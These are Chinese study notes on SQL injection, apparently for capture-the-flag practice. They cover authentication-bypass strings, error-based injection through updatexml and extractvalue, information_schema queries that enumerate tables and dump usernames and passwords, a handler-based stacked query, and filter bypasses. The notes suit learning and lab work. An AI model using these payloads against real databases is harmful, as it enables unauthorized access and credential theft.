1.万能密码 id=1’or'1'='1
                  id=1' or 1=1--+
2.substr函数
 substr(string, start_position, [length])
string：这是你要从中提取子串的原始字符串。它通常是一个数据库表的列名或是一个常量字符串。
start_position：这是开始提取的位置。它通常是一个正整数，表示从字符串的开头算起的字符位置。一些数据库系统也支持使用负数索引，表示从字符串的末尾开始计数。
length：（可选）这是你要提取的子串的长度。如果你省略这个参数，那么SUBSTR函数将从start_position开始提取直到字符串的末尾。
3.concat函数
 concat函数返回结果为多个字符串拼接而成的新的字符串。**如果有任何一个字符串为NULL，则返回为NULL。**
**4、Updatexml报错注入**
UPDATEXML (XML_document, XPath_string, new_value); 
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法的话可以上网搜搜，这里你只需要知道如果不满足新path格式的字符串那么都会产生报错。
当第二个参数包含特殊符号使会报错，并将第二个参数的内容显示在报错信息中
第三个参数：new_value，String格式，替换查找到的符合条件的数据
漏洞形成原理讲解
    由于updatexml的第二个参数需要 Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。
5.extractvalue报错注入
extracvalue和updatexml还是有一点点区别，updatexml是修改，而extractvalue是查询。但是用法和updatexml是一样的。
EXTRACTVALUE (XML_document, XPath_string);
第一个参数：XML_document是String格式，为XML文档对象的名  称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串)
concat:返回结果为连接参数产生的字符串。
原理和updatexml报错注入差不多，也是第二个参数的xpath格式漏洞，所以又如下漏洞语句
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
5.group_concat函数
返回某一个数据库下的所有表名或者某一表下的所有字段名
6.limit关键字的使用
`LIMIT 12,1`是SQL语句中用于限制查询结果集的语法。它表示从查询结果的第13条记录开始，返回一条记录  
`limit 0,1`限制结果集只返回第一个表名  
7.主要查询语句

```plain
#爆当前数据库
select 1,database(),3   
#爆所有数据库
select  group_concat(schema_name)  from  information_schema.schemata 
#爆所有表数据
select  group_concat(table_name)  from  information_schema.tables  where  table_schema='security'  
#爆部分表数据
select  table_name  from  information_schema.tables  where  table_schema='security' limit 0,1
#爆所有字段数据
select group_concat(column_name) from information_schema.columns  where  table_schema='security'  and  table_name='users'
#爆字段数据
select column_name from information_schema.columns  where  table_schema='security'  and  table_name='users'  limit 0,1
#爆字段值
select  group_concat(username,0x3a,password) from  security.users
```
8.mid函数截取字符串
9.在数据库名或表名为全数字时，要用`` 反引号括起来
10.handler（select被过滤时使用）
`1'; handler `1919810931114514`open as`a`; handler `a` read next;#`
handler代替select，以一行一行显示内容open打开表as更改表的别名为aread next读取数据文件内的数据次数
11.and被过滤可以使用&&绕过过滤
 

​
​
